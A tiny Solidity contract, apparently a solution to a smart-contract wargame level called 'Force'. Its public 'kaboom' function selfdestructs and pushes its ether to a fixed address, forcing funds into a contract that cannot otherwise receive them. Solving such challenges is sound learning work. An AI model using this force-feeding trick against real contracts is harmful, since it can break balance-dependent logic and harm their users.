// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Force {

  function kaboom() public {
    selfdestruct(payable(0x4b985CA018c93E1f49dDC552493b2aa4e175C9f0));
  }
}